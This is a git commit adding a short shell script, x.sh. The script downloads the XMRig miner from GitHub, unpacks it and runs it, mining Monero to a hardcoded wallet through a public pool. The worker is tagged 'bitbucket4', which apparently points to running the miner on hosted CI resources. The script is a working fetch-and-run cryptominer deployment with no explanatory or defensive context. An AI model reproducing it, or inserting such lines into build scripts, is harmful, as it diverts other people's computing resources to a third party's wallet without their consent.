6cd236645cf4c2c072f425107272081bf0a01d67
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-26 22:37:27 -0300

    Create x.sh

---
+++ x.sh
@@ -0,0 +1,5 @@
+# xmrig
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz
+tar -xf xmrig-6.18.1-linux-x64.tar.gz
+cd xmrig-6.18.1
+./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.bitbucket4 -p x -t 8
